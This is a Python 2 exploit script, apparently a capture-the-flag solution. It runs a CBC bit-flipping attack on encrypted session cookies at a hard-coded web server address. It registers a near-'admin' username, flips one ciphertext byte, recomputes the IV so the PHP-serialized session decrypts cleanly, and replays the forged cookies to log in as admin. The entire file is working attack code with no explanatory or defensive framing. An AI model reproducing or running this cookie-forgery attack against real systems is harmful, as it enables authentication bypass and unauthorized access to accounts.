#coding=utf-8

import requests
import base64
import urllib
import re


'''
iv_raw = 'tHDGatSeRJCevsmLfMQZWQ%3D%3D'
cipher_raw = 'vNL2IUDp1CGcWI0khWj9p1KK20WnrpyFHIXOK7DKUnWAjsKaEArwgsJ79INK3sv%2F7CMD7IPnJ0YX8qiUofRRGQ%3D%3D'



cipher = base64.b64decode(urllib.unquote(cipher_raw))
print cipher[9]
xor_cipher = cipher[0:9] + chr(ord(cipher[9]) ^ ord('m') ^ ord('a'))+cipher[10:]
xor_cipher = urllib.quote(base64.b64encode(xor_cipher))
##a=urllib.quote(base64.b64encode(cipher))
#print a



print "reword: %s"% xor_cipher
'''


iv_raw = ''
iv_new = ''
cipher_raw = ''
cipher_new = ''
url = "http://114.55.36.69:6662/"
data = {'username':'','password':'12345'}
cookies = {}


def get_cookies(username):
    data['username'] = username
    req = requests.post(url,data=data)
    cookies = requests.utils.dict_from_cookiejar(req.cookies)
    return cookies

def change_cipher(cipher,char='m'):
    cipher = base64.b64decode(urllib.unquote(cipher))
    xor_cipher = cipher[0:9]+chr(ord(cipher[9]) ^ ord(char) ^ ord('a'))+cipher[10:]
    xor_cipher = urllib.quote(base64.b64encode(xor_cipher))
    return xor_cipher

def get_new_hex(string):
    global iv_raw
    global cipher_raw
    global cipher_new
    global cookies
    cookies = get_cookies(string+'dmin')
    cookie = cookies
    cookie['cipher'] = change_cipher(cookies['cipher'])
    req = requests.post(url,cookies=cookie)
    new_hex = re.search(r"('(.*)')",req.text,re.M|re.I).group(1)[1:-7]
    # print new_hex
    new_decode = base64.b64decode(new_hex)
    # print new_decode
    if 'admin' in new_decode:
        iv_raw = cookies['iv']
        cipher_raw = cookies['cipher']
        cipher_new = new_hex
        return True
    else:
        return False

def fix_hex():
    global cipher_new
    global iv_raw
    global iv_new

    cipher = base64.b64decode(cipher_new)
    iv = base64.b64decode(urllib.unquote(iv_raw))
    right = 'a:2:{s:8:"userna'

    for i in range(16):
        iv_new += chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))
    
    iv_new = urllib.quote(base64.b64encode(iv_new))
    # print "[*] Get iv_new: %s" % iv_new

def run_loop():
    for i in range(98,123):
        if(get_new_hex(chr(i))):
            break
        else:
            pass

    # print "[*] Get iv: %s" % iv_raw
    # print "[*] Get cipher: %s" % cipher_raw

def exploit():
    global cookies
    global iv_new
    global cipher_new

    cookie = cookies
    cookie['iv'] = iv_new
    cookie['cipher'] = cipher_raw
    req = requests.post(url,cookies=cookie)
    print(req.text)



run_loop()
fix_hex()
exploit()
    



















    
